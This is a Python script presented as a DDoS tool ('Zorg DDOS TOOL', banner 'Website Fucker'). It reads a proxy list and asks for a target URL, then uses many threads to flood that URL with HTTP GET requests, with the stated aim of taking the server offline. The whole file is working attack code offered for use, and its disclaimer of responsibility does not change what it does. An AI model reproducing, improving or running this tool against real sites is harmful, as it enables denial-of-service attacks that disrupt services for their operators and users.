import random

import requests
import threading
import pyfiglet

"""

Zorg DDOS TOOL
by: U.A

I take no responsibility for the illegal use of this source code. The ZORG DDOS TOOL is a simple but efficient ddos tool. 
It floods the server with http requests from different proxies causing the ping to go up drastically and in many cases 
causes the server to go completely offline.
 
"""

loading_screen = pyfiglet.figlet_format("Website Fucker")
print(loading_screen)
print("By: UA")

p_ = []
count = 0


proxy_file_loc= input("Enter the location of the proxy list: ")
target_url = input("Enter the target url: ")
threading_num = input("Enter the threading number: ")
iteration_num = input("Enter the iteration number: ")

PROXIE_FILE_LOC = proxy_file_loc
TARGET_URL = target_url
THREADING_NUM = int(threading_num)
ITERATION_NUM = int(iteration_num)


file = open(PROXIE_FILE_LOC, "r")

word :str = " "
d = 0

for f in file.read():
    if f == '\n':
        p_.append({"http":word})
        word = ""
    else:
        word = word + f

for x in p_:
    print(x)


s = requests.Session()
s.proxies = p_[13]

s.trust_env = False
s.headers =  {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}

def send_packet(sesssion : requests.Session):
    count = 0

    count += 1
    rsp = sesssion.get(TARGET_URL)
    print(f"Count: [{count}], Rsp:" + str(rsp) + "\n")


class AttackThread(threading.Thread):
    def __init__(self, session : requests.Session, c : int):
        super(AttackThread, self).__init__()
        self.session = session
        self.total = 0
        self.count = c

    def run(self):
        count = 0
        d = 0
        for i in range(self.count):
            rsp = self.session.get(TARGET_URL)
            count += 1
            d = random.randint(0, len(p_))
            print("\n")
            print(f"Count: [{count}], rsp:{rsp}, Loc: {p_[d]}")

threads = [AttackThread(s,ITERATION_NUM) for _ in range(THREADING_NUM)]

for thread in threads:
    thread.start()

for thread in threads:
    thread.join()












